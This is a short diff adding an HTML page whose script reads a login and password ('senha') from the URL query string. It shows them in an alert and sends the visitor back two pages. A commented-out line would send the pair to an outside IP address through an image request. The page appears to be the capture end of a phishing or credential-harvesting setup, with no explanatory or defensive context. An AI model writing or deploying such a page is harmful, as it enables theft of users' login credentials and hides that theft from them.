@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head><title></title></head>
+	<body>
+		<script type="text/javascript">
+			var url   = window.location.search.replace("?", "");
+			var items = url.split("&");
+			var array = {
+			  'login' : items[0],
+			  'senha' : items[1]
+			}
+			retorno = array.login + " / " + array.senha;
+			// new Image().src = "http://192.168.0.123/?=" + retorno
+			alert(retorno);
+			window.history.go(-2);
+		</script>
+	</body>
+</html>
